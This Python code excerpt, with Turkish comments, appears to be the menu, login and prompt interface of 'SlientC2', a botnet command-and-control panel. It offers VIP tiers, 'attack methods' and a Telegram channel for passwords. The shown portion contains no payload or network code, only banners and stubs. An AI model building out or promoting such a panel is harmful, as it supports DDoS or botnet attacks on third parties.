...
def show_logo_and_boxes():
    ...
    # Kutu 1: Welcome
    print(gradient_text("            ╔════════════════════════════════════╗"))
    print(gradient_text("            ║       Welcome to SlientC2          ║"))
    print(gradient_text("            ║     Owner: Zeldy  |  v4.0          ║"))
    print(gradient_text("            ╚════════════════════════════════════╝"))
    print()

    # Kutu 2: Telegram
    print(gradient_text("                ╔══════════════════════════════╗"))
    print(gradient_text("                ║  Telegram: @SlientBotnet     ║"))
    print(gradient_text("                ╚══════════════════════════════╝"))
    print()

    # Kutu 3: Help
    print(gradient_text("            ╔════════════════════════════════════╗"))
    print(gradient_text("            ║   Type [help] to see the commands  ║"))
    print(gradient_text("            ╚════════════════════════════════════╝"))
    print()

    user_status = "VIP" if IS_VIP else "NORMAL"
    print(gradient_text(f"[!] Kullanıcı: {CURRENT_USER} ({user_status})"))
    print(gradient_text("[!] 'menu' ile tüm methodları gör."))
    print(gradient_text("[!] 'stop' ile tüm saldırıları durdurabilirsiniz.\n"))
...
def login():
    ...
    print()
    print(gradient_text("            ╔═════════════════════════════════════╗"))
    print(gradient_text("            ║       SlientC2 Login                ║"))
    print(gradient_text("            ║   For password: t.me/SlientBotnet   ║"))
    print(gradient_text("            ╚═════════════════════════════════════╝"))
    print()
...
def prompt():
    ...
    if PROMPT_STYLE == 1:
        ...
        if PROMPT_GRADIENT:
            ...
            # Manuel segment renkleri de smooth gradient olsun (kutu yok)
